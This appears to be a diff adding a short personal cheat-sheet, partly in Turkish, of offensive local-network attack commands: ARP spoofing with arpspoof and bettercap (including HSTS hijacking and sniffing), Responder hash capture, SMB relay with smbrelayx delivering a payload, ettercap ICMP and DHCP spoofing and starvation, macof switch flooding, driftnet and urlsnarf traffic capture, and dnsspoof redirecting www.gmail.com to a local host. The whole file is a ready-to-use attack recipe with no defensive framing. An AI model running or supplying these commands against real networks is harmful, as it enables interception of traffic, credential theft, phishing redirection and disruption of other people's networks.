@@ -1,0 +1,35 @@
+#windows
+-------------------------
+arpspoof -i eth0 -t <gateway> <ip adresi>
+responder -I eth0 -w -r -f 
+smbrelayx.py -h <ip adresi> -e <payload>
+-------------------------
+
+bettercap
+net.recon on
+net.probe on
+set arp.spoof.targets ipadresi
+set arp.spoof.fulldublex true
+set arp.spoof.internal true
+hstshijack/hstshijack 
+net.sniff on
+
+
+
+icmp redirect : ettercap -G 
+dhcp spoofing : ettercap -G
+dhcp starvation : etttercap -G 
+macof : macof -i <interface> -s <ipadresi> -n 10000  : cam tablosunu doldurarak switchi yavaşlatabilir bu sayede ağa yeni cihazların katılması engellenir.
+
+
+
+driftnet : arpspoof -i wlan0 -t <ip> <ip>   //     driftnet -i wlan0 -v
+urlsnarf : arpspoof -i wlan0 -t <ip> <ip>   //     urlsnarf -i wlan0 -p pcapfile
+
+
+-------------------------------------------- dns spoofing ------------------------
+root@kali:~# cat hosts.txt
+192.168.1.9 www.gmail.com
+192.168.1.9 someplace.com
+root@kali:~# dnsspoof -i eth0 -f hosts.txt
+----------------------------------------------------------------------------------
